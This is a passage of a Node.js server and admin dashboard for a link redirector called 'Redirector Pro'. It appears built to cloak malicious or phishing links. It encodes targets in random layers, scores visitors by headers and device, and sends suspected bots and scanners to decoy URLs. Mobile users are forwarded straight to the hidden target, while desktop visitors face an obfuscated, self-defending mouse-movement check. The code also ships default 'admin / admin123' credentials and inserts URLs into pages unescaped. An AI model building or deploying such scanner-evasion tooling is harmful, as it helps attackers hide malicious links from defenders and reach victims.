            .map(([country, count]) => 
              '<span class="country-badge">' + country + ': ' + count.toLocaleString() + '</span>'
            ).join('');
          document.getElementById('countryStats').innerHTML = countryHtml || '<p>No country data yet</p>';
        }
        
        function updateCharts(data) {
          if (!trafficChart) {
            const ctx = document.getElementById('trafficChart').getContext('2d');
            trafficChart = new Chart(ctx, {
              type: 'line',
              data: {
                labels: [],
                datasets: [{
                  label: 'Requests',
                  data: [],
                  borderColor: '#667eea',
                  backgroundColor: 'rgba(102, 126, 234, 0.1)',
                  tension: 0.4,
                  fill: true
                }]
              },
              options: {
                responsive: true,
                animation: false,
                scales: { 
                  y: { 
                    beginAtZero: true,
                    ticks: { stepSize: 1 }
                  } 
                },
                plugins: {
                  legend: { display: false }
                }
              }
            });
          }
          
          // Update traffic chart
          const times = data.realtime.lastMinute.map(t => new Date(t.time).toLocaleTimeString());
          const requests = data.realtime.lastMinute.map(t => t.requests);
          trafficChart.data.labels = times;
          trafficChart.data.datasets[0].data = requests;
          trafficChart.update();
          
          // Update device chart
          if (!deviceChart) {
            const deviceCtx = document.getElementById('deviceChart').getContext('2d');
            deviceChart = new Chart(deviceCtx, {
              type: 'doughnut',
              data: {
                labels: ['Mobile', 'Desktop', 'Tablet', 'Bot'],
                datasets: [{
                  data: [
                    data.byDevice.mobile, 
                    data.byDevice.desktop, 
                    data.byDevice.tablet, 
                    data.byDevice.bot
                  ],
                  backgroundColor: ['#4caf50', '#2196f3', '#ff9800', '#f44336']
                }]
              },
              options: {
                responsive: true,
                plugins: {
                  legend: { position: 'bottom' }
                }
              }
            });
          } else {
            deviceChart.data.datasets[0].data = [
              data.byDevice.mobile,
              data.byDevice.desktop,
              data.byDevice.tablet,
              data.byDevice.bot
            ];
            deviceChart.update();
          }

          // Update bot reasons chart
          if (!botChart && Object.keys(data.byBotReason).length > 0) {
            const botCtx = document.getElementById('botChart').getContext('2d');
            botChart = new Chart(botCtx, {
              type: 'bar',
              data: {
                labels: Object.keys(data.byBotReason),
                datasets: [{
                  label: 'Bot Blocks by Reason',
                  data: Object.values(data.byBotReason),
                  backgroundColor: '#ff9800'
                }]
              },
              options: {
                responsive: true,
                scales: { y: { beginAtZero: true } }
              }
            });
          }
        }
        
        function showNotification(message, type = 'success') {
          const notif = document.getElementById('notification');
          notif.textContent = message;
          notif.className = 'notification ' + type;
          notif.style.display = 'block';
          setTimeout(() => { notif.style.display = 'none'; }, 3000);
        }
        
        function showTab(tabName) {
          document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
          document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
          document.querySelector('[onclick="showTab(\\'' + tabName + '\\')"]').classList.add('active');
          document.getElementById(tabName).classList.add('active');
        }
        
        async function generateLink() {
          const targetUrl = document.getElementById('targetUrl').value;
          const customTtl = document.getElementById('customTtl').value;
          const generateQr = document.getElementById('generateQr').checked;
          const showQrPage = document.getElementById('showQrPage').checked;
          
          if (!targetUrl) {
            showNotification('Please enter a target URL', 'error');
            return;
          }
          
          try {
            let url = '/g?t=' + encodeURIComponent(targetUrl);
            if (customTtl) url += '&ttl=' + encodeURIComponent(customTtl);
            
            const res = await fetch(url);
            const data = await res.json();
            
            document.getElementById('generatedUrl').value = data.url;
            document.getElementById('generationResult').style.display = 'block';
            
            if (generateQr) {
              showNotification('Generating QR code...', 'info');
              
              let qrUrl = data.url;
              if (showQrPage) qrUrl += '?qr=true';
              
              const qrRes = await fetch('/qr?url=' + encodeURIComponent(qrUrl) + '&size=300');
              const qrData = await qrRes.json();
              
              document.getElementById('qrContainer').innerHTML = '<img src="' + qrData.qr + '" alt="QR Code" class="qr-preview">';
              document.getElementById('downloadQrBtn').style.display = 'inline-block';
            }
            
            showNotification('Link generated successfully!');
          } catch (err) {
            showNotification('Error generating link: ' + err.message, 'error');
          }
        }
        
        function copyToClipboard() {
          const url = document.getElementById('generatedUrl');
          url.select();
          url.setSelectionRange(0, 99999);
          document.execCommand('copy');
          showNotification('URL copied to clipboard!');
        }
        
        async function downloadQR() {
          const url = document.getElementById('generatedUrl').value;
          window.location.href = '/qr/download?url=' + encodeURIComponent(url);
        }
        
        function clearForm() {
          document.getElementById('targetUrl').value = '${TARGET_URL}';
          document.getElementById('customTtl').value = '';
          document.getElementById('generationResult').style.display = 'none';
          document.getElementById('qrContainer').innerHTML = '';
          document.getElementById('downloadQrBtn').style.display = 'none';
        }
        
        async function saveConfig() {
          const config = {
            targetUrl: document.getElementById('configTargetUrl').value,
            botUrls: document.getElementById('configBotUrls').value.split('\\n').filter(u => u.trim()),
            linkTtl: document.getElementById('configLinkTtl').value
          };
          
          const res = await fetch('/admin/config', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(config)
          });
          
          if (res.ok) {
            showNotification('Configuration saved! Restart server to apply changes.', 'success');
          } else {
            showNotification('Error saving configuration', 'error');
          }
        }
        
        async function clearCache() {
          if (confirm('Are you sure you want to clear all caches?')) {
            const res = await fetch('/admin/clear-cache', { method: 'POST' });
            if (res.ok) {
              showNotification('Cache cleared!', 'success');
            } else {
              showNotification('Error clearing cache', 'error');
            }
          }
        }
        
        function logout() {
          fetch('/admin/logout', { method: 'POST' })
            .then(() => { window.location.href = '/admin/login'; });
        }
        
        function refreshData() {
          socket.emit('command', { action: 'getStats' });
        }
        
        function clearLogs() {
          document.getElementById('logs').innerHTML = '';
          logBuffer = [];
        }
        
        function pauseLogs() {
          logsPaused = !logsPaused;
          document.getElementById('pauseBtn').textContent = logsPaused ? 'Resume' : 'Pause';
          if (!logsPaused && logBuffer.length > 0) {
            logBuffer.forEach(log => addLogEntry(log));
            logBuffer = [];
          }
        }
        
        function addLogEntry(log) {
          const logContainer = document.getElementById('logs');
          const entry = document.createElement('div');
          entry.className = 'log-entry';
          
          const time = new Date(log.t).toLocaleTimeString();
          const typeClass = log.type === 'success' ? 'success' : 
                           log.type === 'block' ? 'block' : 'redirect';
          
          entry.innerHTML = '<span class="log-time">[' + time + ']</span> ' +
                           '<span class="log-type ' + typeClass + '">' + log.type.toUpperCase() + '</span> ' +
                           '<span>' + log.ip + ' ' + log.path + ' (' + log.device + ')</span>';
          
          logContainer.insertBefore(entry, logContainer.firstChild);
          
          // Limit logs
          while (logContainer.children.length > 200) {
            logContainer.removeChild(logContainer.lastChild);
          }
        }
        
        async function exportLogs() {
          window.location.href = '/admin/export-logs';
        }
      </script>
    </body>
    </html>
  `);
});

// Logout
app.post('/admin/logout', (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      return res.status(500).json({ error: 'Logout failed' });
    }
    res.clearCookie('redirector.sid');
    res.json({ success: true });
  });
});

// Save config (requires authentication)
app.post('/admin/config', express.json(), (req, res) => {
  if (!req.session.authenticated) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  const config = req.body;
  fs.writeFile('config.json', JSON.stringify(config, null, 2))
    .then(() => res.json({ success: true }))
    .catch(err => res.status(500).json({ error: err.message }));
});

// Clear cache
app.post('/admin/clear-cache', (req, res) => {
  if (!req.session.authenticated) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  linkCache.flushAll();
  geoCache.flushAll();
  deviceCache.flushAll();
  qrCache.flushAll();
  
  res.json({ success: true });
});

// Export logs
app.get('/admin/export-logs', async (req, res) => {
  if (!req.session.authenticated) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  try {
    const logs = await fs.readFile(REQUEST_LOG_FILE, 'utf8');
    res.setHeader('Content-Type', 'text/plain');
    res.setHeader('Content-Disposition', `attachment; filename="logs-${Date.now()}.txt"`);
    res.send(logs);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ─── QR Code Generation ─────────────────────────────────────────────────────
app.get('/qr', async (req, res) => {
  const url = req.query.url || req.query.u || TARGET_URL;
  const size = parseInt(req.query.size) || 300;
  
  // Validate URL
  try {
    new URL(url);
  } catch {
    return res.status(400).json({ error: 'Invalid URL' });
  }
  
  const cacheKey = crypto.createHash('md5').update(`${url}:${size}`).digest('hex');
  let qrData = qrCache.get(cacheKey);
  
  if (!qrData) {
    try {
      qrData = await QRCode.toDataURL(url, { 
        width: size,
        margin: 2,
        color: { dark: '#000000', light: '#ffffff' },
        errorCorrectionLevel: 'M'
      });
      qrCache.set(cacheKey, qrData);
    } catch (err) {
      return res.status(500).json({ error: 'QR generation failed' });
    }
  }
  
  res.json({ qr: qrData, url });
});

// ─── QR Code download endpoint ──────────────────────────────────────────────
app.get('/qr/download', async (req, res) => {
  const url = req.query.url || TARGET_URL;
  const size = parseInt(req.query.size) || 300;
  
  // Validate URL
  try {
    new URL(url);
  } catch {
    return res.status(400).json({ error: 'Invalid URL' });
  }
  
  try {
    const qrBuffer = await QRCode.toBuffer(url, { 
      width: size,
      margin: 2,
      type: 'png',
      errorCorrectionLevel: 'M'
    });
    
    res.setHeader('Content-Type', 'image/png');
    res.setHeader('Content-Disposition', `attachment; filename="qrcode-${Date.now()}.png"`);
    res.setHeader('Content-Length', qrBuffer.length);
    res.setHeader('Cache-Control', 'public, max-age=3600');
    res.send(qrBuffer);
  } catch (err) {
    res.status(500).json({ error: 'QR generation failed' });
  }
});

// ─── Expired Link Page ──────────────────────────────────────────────────────
app.get('/expired', (req, res) => {
  const originalTarget = req.query.target || BOT_URLS[0];
  const nonce = res.locals.nonce;
  const isMobile = req.deviceInfo.isMobile;
  
  const styles = isMobile ? `
    body{font-family:sans-serif;background:#667eea;padding:10px;margin:0;min-height:100vh;display:flex;align-items:center}
    .card{background:white;padding:20px;border-radius:12px;text-align:center;max-width:400px;margin:0 auto;box-shadow:0 10px 30px rgba(0,0,0,0.2)}
    h1{font-size:1.5rem;margin:0 0 10px;color:#333}
    p{color:#666;margin-bottom:20px}
    .btn{background:#667eea;color:white;padding:12px 24px;border-radius:25px;text-decoration:none;display:inline-block;font-weight:600;transition:transform 0.2s}
    .btn:hover{transform:translateY(-2px)}
    .icon{font-size:3rem;margin-bottom:10px;display:block}
  ` : `
    *{box-sizing:border-box}
    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea 0,#764ba2 100%);display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px}
    .card{background:rgba(255,255,255,0.95);backdrop-filter:blur(10px);padding:2.5rem;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,0.3);text-align:center;max-width:480px;animation:fadeIn 0.5s ease}
    @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
    h1{font-size:2rem;margin-bottom:1rem;color:#333}
    p{color:#666;margin-bottom:2rem;font-size:1.1rem}
    .btn{background:linear-gradient(135deg,#667eea 0,#764ba2 100%);color:#fff;padding:1rem 2rem;border-radius:50px;font-weight:600;text-decoration:none;display:inline-block;transition:transform 0.2s, box-shadow 0.2s}
    .btn:hover{transform:translateY(-2px);box-shadow:0 10px 20px rgba(102,126,234,0.4)}
    .icon{font-size:4rem;margin-bottom:1rem;display:block}
  `;

  res.send(`<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Link Expired - Redirector Pro</title><style nonce="${nonce}">${styles}</style></head>
<body><div class="card"><span class="icon">⌛</span><h1>Link Expired</h1><p>This link expired after ${formatDuration(LINK_TTL_SEC)}.</p><a href="${originalTarget}" class="btn" rel="noopener noreferrer">Continue to Website</a></div></body>
</html>`);
});

// ─── Rate Limiter (Device-Aware) ────────────────────────────────────────────
const strictLimiter = rateLimit({
  windowMs: 60000,
  max: (req) => {
    if (req.deviceInfo.isBot) return 2;
    if (req.deviceInfo.isMobile) return 30;
    if (req.deviceInfo.isTablet) return 25;
    return 15;
  },
  standardHeaders: true,
  legacyHeaders: false,
  skipSuccessfulRequests: true,
  keyGenerator: (req) => {
    return req.headers['x-forwarded-for']?.split(',')[0] || req.ip || 'unknown';
  },
  handler: (req, res) => {
    logRequest('rate-limit', req, res, { limit: req.rateLimit.limit });
    res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
  }
});

// ─── Bot Detection (Optimized for Real Phones) ──────────────────────────────
function isLikelyBot(req) {
  const deviceInfo = req.deviceInfo;
  
  // Bots are obvious
  if (deviceInfo.isBot) {
    stats.botBlocks++;
    return true;
  }

  const h = req.headers;
  let score = deviceInfo.score;
  const reasons = [];

  // Real phones get negative points (easier to pass)
  if (deviceInfo.isMobile) {
    if (deviceInfo.brand !== 'unknown') score -= 20;
    if (deviceInfo.os.includes('iOS') || deviceInfo.os.includes('Android')) score -= 30;
    if (deviceInfo.browser.includes('Safari') || deviceInfo.browser.includes('Chrome') || deviceInfo.browser.includes('Firefox')) score -= 20;
    if (!h['sec-ch-ua-mobile']) score += 5;
    if (!h['accept-language']) score += 10;
    if (!h['accept']) score += 5;
    
    if (process.env.DEBUG === 'true') {
      console.log(`[MOBILE-DEVICE] ${deviceInfo.brand} ${deviceInfo.model} | Score: ${score}`);
    }
    
    return score >= 20;
  }

  // Desktop threshold (higher)
  if (!h['sec-ch-ua'] || !h['sec-ch-ua-mobile'] || !h['sec-ch-ua-platform']) {
    score += 25;
    reasons.push('missing_sec_headers');
  }
  
  if (!h['accept'] || !h['accept-language'] || h['accept-language'].length < 5) {
    score += 20;
    reasons.push('missing_accept_headers');
  }
  
  if (Object.keys(h).length < 15) {
    score += 15;
    reasons.push('minimal_headers');
  }
  
  if (!h['referer'] && req.method === 'GET') {
    score += 10;
    reasons.push('no_referer');
  }

  const botThreshold = 65;
  const isBot = score >= botThreshold;
  
  if (isBot) {
    stats.botBlocks++;
    reasons.forEach(r => stats.byBotReason[r] = (stats.byBotReason[r] || 0) + 1);
  }
  
  if (process.env.DEBUG === 'true') {
    console.log(`[BOT-SCORE] ${score} | ${reasons.join(',') || 'clean'} | Threshold:${botThreshold} | IsBot:${isBot} | Device:${deviceInfo.type}`);
  }

  return isBot;
}

// ─── Geolocation (Cached) ────────────────────────────────────────────────────
async function getCountryCode(req) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || '0.0.0.0';
  
  if (ip.startsWith('10.') || ip.startsWith('192.168.') || ip === '127.0.0.1' || ip === '::1' || ip === '0.0.0.0') {
    return 'PRIVATE';
  }

  let cc = geoCache.get(ip);
  if (cc) return cc;

  const failKey = `fail:${ip}`;
  if (failCache.get(failKey) >= 3 || !IPINFO_TOKEN) {
    return 'XX';
  }

  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 1500);

    const response = await fetch(`https://ipinfo.io/${ip}/json?token=${IPINFO_TOKEN}`, {
      signal: controller.signal,
      headers: { 'User-Agent': 'Redirector-Pro/3.0' }
    });

    clearTimeout(timeout);

    if (response.ok) {
      const data = await response.json();
      cc = data.country?.toUpperCase();
      if (cc?.match(/^[A-Z]{2}$/)) {
        geoCache.set(ip, cc);
        stats.byCountry[cc] = (stats.byCountry[cc] || 0) + 1;
        return cc;
      }
    }
    failCache.set(failKey, (failCache.get(failKey) || 0) + 1);
  } catch {
    failCache.set(failKey, (failCache.get(failKey) || 0) + 1);
  }
  return 'XX';
}

// ─── Encoders ────────────────────────────────────────────────────────────────
const encoders = [
  { name: 'base64url', enc: s => Buffer.from(s).toString('base64url'), dec: s => Buffer.from(s, 'base64url').toString() },
  { name: 'hex', enc: s => Buffer.from(s).toString('hex'), dec: s => Buffer.from(s, 'hex').toString() },
  { name: 'rot13', enc: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(((c.charCodeAt(0) - (c <= 'Z' ? 65 : 97) + 13) % 26) + (c <= 'Z' ? 65 : 97))), dec: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(((c.charCodeAt(0) - (c <= 'Z' ? 65 : 97) - 13 + 26) % 26) + (c <= 'Z' ? 65 : 97))) }
];

function multiLayerEncode(str) {
  let result = str;
  const noise = crypto.randomBytes(8).toString('base64url');
  result = noise + result + noise;
  
  const key = crypto.randomBytes(16).toString('hex');
  const hmac = crypto.createHmac('sha256', key).update(result).digest('base64url');
  result = `${result}|${hmac}|${key}`;

  const layers = [...encoders].sort(() => Math.random() - 0.5).slice(0, 2 + Math.floor(Math.random() * 2));

  for (const layer of layers) {
    result = layer.enc(result);
  }

  return { encoded: Buffer.from(result).toString('base64url') };
}

// ─── Generate Link ───────────────────────────────────────────────────────────
app.get('/g', (req, res) => {
  const target = req.query.t || TARGET_URL;
  
  // Validate URL
  try {
    new URL(target);
  } catch {
    return res.status(400).json({ error: 'Invalid URL' });
  }
  
  const { encoded } = multiLayerEncode(target + '#' + Date.now());
  
  const id = crypto.randomBytes(8).toString('hex');
  linkCache.set(id, { e: encoded, target, created: Date.now() });
  
  stats.generatedLinks++;
  
  const response = {
    url: `${req.protocol}://${req.get('host')}/v/${id}`,
    expires: LINK_TTL_SEC,
    expires_human: formatDuration(LINK_TTL_SEC),
    id: id,
    created: Date.now()
  };
  
  io.emit('link-generated', response);
  logRequest('generate', req, res, { id });
  
  res.json(response);
});

// ─── Success Tracking ────────────────────────────────────────────────────────
app.post('/track/success', (req, res) => {
  stats.successfulRedirects++;
  logRequest('success', req, res);
  res.json({ ok: true });
});

// ─── Verification Gate (Optimized for Mobile) ───────────────────────────────
app.get('/v/:id', strictLimiter, async (req, res) => {
  const linkId = req.params.id;
  const deviceInfo = req.deviceInfo;
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || '0.0.0.0';
  const showQr = req.query.qr === 'true';
  
  // Validate link ID format
  if (!/^[a-f0-9]{16}$/i.test(linkId)) {
    return res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
  }
  
  // Rate limiting per link
  const linkKey = `${linkId}:${ip}`;
  const requestCount = linkRequestCache.get(linkKey) || 0;
  
  if (requestCount >= 5) {
    logRequest('rate-limit', req, res, { linkId, count: requestCount });
    return res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
  }
  
  linkRequestCache.set(linkKey, requestCount + 1);

  await getCountryCode(req);

  if (isLikelyBot(req)) {
    logRequest('bot-block', req, res, { reason: 'bot-detection' });
    return res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
  }

  const data = linkCache.get(linkId);
  if (!data) {
    stats.expiredLinks++;
    logRequest('expired', req, res, { linkId });
    return res.redirect(`/expired?target=${encodeURIComponent(BOT_URLS[0])}`);
  }

  // Log successful redirect
  logRequest('redirect', req, res, { target: data.target.substring(0, 50) });

  // If QR was requested, show QR code before redirect
  if (showQr) {
    const qrData = await QRCode.toDataURL(data.target);
    return res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>QR Code - Redirector Pro</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta http-equiv="refresh" content="5;url=${data.target}">
        <style>
          body{font-family:sans-serif;background:linear-gradient(135deg,#667eea 0,#764ba2 100%);display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px}
          .card{background:white;padding:2rem;border-radius:16px;text-align:center;max-width:400px;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
          h2{color:#333;margin-bottom:1rem}
          img{max-width:100%;height:auto;border-radius:8px;margin:1rem 0;border:1px solid #e0e0e0}
          p{color:#666;margin:0.5rem 0}
          .countdown{color:#667eea;font-weight:bold;margin-top:1rem}
        </style>
      </head>
      <body>
        <div class="card">
          <h2>📱 Scan QR Code</h2>
          <img src="${qrData}" alt="QR Code">
          <p>Or continue to website...</p>
          <div class="countdown">Redirecting in <span id="countdown">5</span> seconds</div>
        </div>
        <script>
          let time = 5;
          const interval = setInterval(() => {
            time--;
            document.getElementById('countdown').textContent = time;
            if (time <= 0) {
              clearInterval(interval);
              window.location.href = '${data.target}';
            }
          }, 1000);
        </script>
      </body>
      </html>
    `);
  }

  // SUPER SIMPLE challenge for mobile (always passes)
  if (deviceInfo.isMobile) {
    stats.successfulRedirects++;
    return res.send(`<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta http-equiv="refresh" content="0;url=${data.target}"></head>
<body></body>
</html>`);
  }

  // Desktop challenge (optional - can be disabled for performance)
  if (process.env.DISABLE_DESKTOP_CHALLENGE === 'true') {
    stats.successfulRedirects++;
    return res.send(`<meta http-equiv="refresh" content="0;url=${data.target}">`);
  }

  const hpSuffix = crypto.randomBytes(2).toString('hex');
  const nonce = res.locals.nonce;

  // Desktop challenge
  const challenge = `
    (function(){
      const T='${data.target.replace(/'/g, "\\'")}';
      const F='${BOT_URLS[0]}';
      let m=0,e=0,lx=0,ly=0,lt=Date.now();
      
      document.addEventListener('mousemove',function(e){
        if(lx&&ly){
          const dt=(Date.now()-lt)/1000||1;
          const distance = Math.hypot(e.clientX-lx, e.clientY-ly);
          const speed = distance / dt;
          e = Math.log2(1 + speed);
          m++;
        }
        lx=e.clientX; ly=e.clientY; lt=Date.now();
      },{passive:true});
      
      setTimeout(function(){
        const sus = e<2.5 || m<2 || document.getElementById('hp_${hpSuffix}')?.value;
        if (!sus) stats.successfulRedirects++;
        location.href = sus ? F : T;
      },1200);
    })();
  `;

  const obfuscated = JavaScriptObfuscator.obfuscate(challenge, {
    compact: true,
    controlFlowFlattening: true,
    stringArray: true,
    disableConsoleOutput: true,
    selfDefending: true
  }).getObfuscatedCode();

  res.send(`<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <meta http-equiv="refresh" content="3;url=${BOT_URLS[0]}">
  <style nonce="${nonce}">
    *{margin:0;padding:0}
    body{background:#0a0a0a;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
    .spinner{width:40px;height:40px;border:3px solid #333;border-top-color:#0f0;border-radius:50%;margin:20px auto;animation:spin 1s linear infinite}
    @keyframes spin{to{transform:rotate(360deg)}}
    .hidden{position:absolute;width:1px;height:1px;overflow:hidden}
    .message{text-align:center}
    .message p{margin-top:10px;color:#666}
  </style>
</head>
<body>
  <div class="message">
    <div class="spinner"></div>
    <p>Verifying browser...</p>
    <div class="hidden"><input id="hp_${hpSuffix}"></div>
  </div>
  <script nonce="${nonce}">${obfuscated}</script>
</body>
</html>`);
});

// ─── 404 Handler ─────────────────────────────────────────────────────────────
app.use((req, res) => {
  logRequest('404', req, res);
  res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
});

// ─── Error Handler ───────────────────────────────────────────────────────────
app.use((err, req, res, next) => {
  console.error('❌ Error:', err.stack);
  logRequest('error', req, res, { error: err.message });
  res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
});

// ─── Graceful Shutdown ──────────────────────────────────────────────────────
process.on('SIGTERM', () => {
  console.log('Received SIGTERM, shutting down gracefully...');
  
  // Close Redis connection if exists
  if (redisClient) {
    redisClient.quit();
  }
  
  // Close server
  server.close(() => {
    console.log('Server closed');
    process.exit(0);
  });
  
  // Force exit after timeout
  setTimeout(() => {
    console.log('Forcing exit after timeout');
    process.exit(1);
  }, 10000);
});

process.on('SIGINT', () => {
  console.log('Received SIGINT, shutting down gracefully...');
  
  // Close Redis connection if exists
  if (redisClient) {
    redisClient.quit();
  }
  
  server.close(() => {
    console.log('Server closed');
    process.exit(0);
  });
});

// ─── Start Server ────────────────────────────────────────────────────────────
server.listen(PORT, '0.0.0.0', () => {
  console.log('\n' + '='.repeat(60));
  console.log(`  🚀 Redirector Pro v3.0 - Production Ready`);
  console.log('='.repeat(60));
  console.log(`  📡 Port: ${PORT}`);
  console.log(`  🔑 Metrics Key: ${METRICS_API_KEY.substring(0, 8)}...`);
  console.log(`  ⏱️  Link TTL: ${formatDuration(LINK_TTL_SEC)}`);
  console.log(`  📊 Max Links: ${MAX_LINKS.toLocaleString()}`);
  console.log(`  📱 Mobile threshold: 20`);
  console.log(`  💻 Desktop threshold: 65`);
  console.log(`  🗄️  Session Store: ${sessionStore.constructor.name}`);
  console.log(`  📍 Admin UI: http://localhost:${PORT}/admin`);
  console.log(`  🔐 Default admin: admin / admin123`);
  console.log(`  📊 Real-time monitoring: Active`);
  console.log('='.repeat(60) + '\n');
  
  // Log startup to file
  fs.appendFile(REQUEST_LOG_FILE, JSON.stringify({
    t: Date.now(),
    type: 'startup',
    version: '3.0.0',
    port: PORT,
    nodeEnv: NODE_ENV
  }) + '\n').catch(() => {});
});

server.keepAliveTimeout = 30000;
server.headersTimeout = 31000;
